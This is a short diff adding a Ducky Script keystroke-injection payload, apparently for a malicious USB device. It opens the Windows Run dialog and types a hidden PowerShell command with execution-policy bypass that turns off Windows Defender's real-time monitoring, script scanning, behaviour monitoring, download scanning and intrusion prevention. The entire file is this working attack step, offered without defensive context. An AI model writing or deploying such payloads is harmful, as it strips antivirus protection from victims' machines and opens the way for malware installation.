@@ -1,0 +1,3 @@
+DEFAULT_DELAY 500
+GUI r
+STRING powershell -command ' NoP -Ep Bypass -W H -C Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'
